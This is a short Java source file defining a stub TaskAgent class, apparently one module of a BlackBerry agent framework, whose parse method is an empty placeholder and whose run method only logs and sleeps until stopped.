package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class TaskAgent extends Agent
{
	static Debug debug = new Debug("TaskAgent", DebugLevel.VERBOSE );

	public TaskAgent(int AgentStatus)
	{
		super(Agent.AGENT_TASK, AgentStatus, true);

	}

	protected TaskAgent(int AgentStatus, byte[] confParams)
	{
		this(AgentStatus);
		Parse(confParams);
	}

	protected boolean Parse(byte[] confParameters)
	{
		// TODO Auto-generated method stub
		return false;
	}

	public void AgentRun()
	{
		debug.trace("run");

		this.SleepUntilStopped();

	}
}
